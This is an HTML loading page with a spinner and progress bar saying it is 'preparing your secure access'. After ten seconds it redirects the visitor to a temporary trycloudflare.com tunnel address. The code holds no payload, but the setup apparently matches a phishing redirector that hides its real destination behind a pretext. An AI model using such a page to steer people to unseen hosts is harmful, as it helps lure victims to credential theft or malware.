<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>
<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Inter, Arial, sans-serif;
}

body{
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background:#f8fafc;
    color:#1f2937;
}

.container{
    width:320px;
    text-align:center;
}

.spinner{
    width:42px;
    height:42px;
    margin:0 auto 24px;
    border:3px solid #e5e7eb;
    border-top:3px solid #3b82f6;
    border-radius:50%;
    animation:spin .8s linear infinite;
}

@keyframes spin{
    to{
        transform:rotate(360deg);
    }
}

h2{
    font-size:24px;
    font-weight:600;
    margin-bottom:10px;
}

p{
    font-size:14px;
    color:#6b7280;
    margin-bottom:24px;
}

.progress{
    width:100%;
    height:4px;
    background:#e5e7eb;
    border-radius:999px;
    overflow:hidden;
}

.bar{
    width:0%;
    height:100%;
    background:#3b82f6;
    animation:progress 10s linear forwards;
}

@keyframes progress{
    from{width:0%;}
    to{width:100%;}
}

#percent{
    margin-top:12px;
    font-size:13px;
    color:#3b82f6;
    font-weight:600;
}
</style>
</head>

<body>

<div class="container">
    <div class="spinner"></div>
    <h2>Loading</h2>
    <p>Preparing your secure access. Please wait a moment.</p>
    <div class="progress">
        <div class="bar"></div>
    </div>
    <div id="percent">0%</div>
</div>
<script>
let progress = 0;

const timer = setInterval(() => {
    progress++;
    document.getElementById("percent").textContent = progress + "%";

    if (progress >= 100) {
        clearInterval(timer);

        // Replace with your website
        window.location.href = "https://refined-nuts-ebook-halloween.trycloudflare.com";
    }
}, 100);
</script>
</body>
</html>
